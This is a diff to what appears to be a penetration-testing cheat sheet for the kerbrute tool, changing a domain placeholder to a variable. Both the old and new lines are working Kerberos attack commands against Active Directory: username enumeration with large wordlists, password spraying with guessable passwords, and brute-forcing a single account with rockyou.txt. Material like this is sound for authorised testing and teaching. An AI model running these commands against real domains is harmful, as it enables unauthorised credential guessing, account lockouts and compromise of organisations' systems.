@@ -24,17 +24,17 @@ sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
 
 ```bash
 # Username enumeration — NO lockout risk
-kerbrute userenum -d <domain> --dc <DC-IP> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+kerbrute userenum -d $Domain --dc <DC-IP> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
 
 # Pipe in a custom list (e.g. from username-anarchy)
 kerbrute userenum -d corp.local --dc 192.168.1.10 candidate_users.txt
 
 # Password spray — DOES count toward lockout, use carefully
-kerbrute passwordspray -d <domain> --dc <DC-IP> valid_users.txt 'Password123!'
-kerbrute passwordspray -d <domain> --dc <DC-IP> valid_users.txt 'Summer2024!'
+kerbrute passwordspray -d $Domain --dc <DC-IP> valid_users.txt 'Password123!'
+kerbrute passwordspray -d $Domain --dc <DC-IP> valid_users.txt 'Summer2024!'
 
 # Brute force a single user — counts toward lockout
-kerbrute bruteuser -d <domain> --dc <DC-IP> valid_users.txt /usr/share/wordlists/rockyou.txt
+kerbrute bruteuser -d $Domain --dc <DC-IP> valid_users.txt /usr/share/wordlists/rockyou.txt
 ```
 
 **Output:**
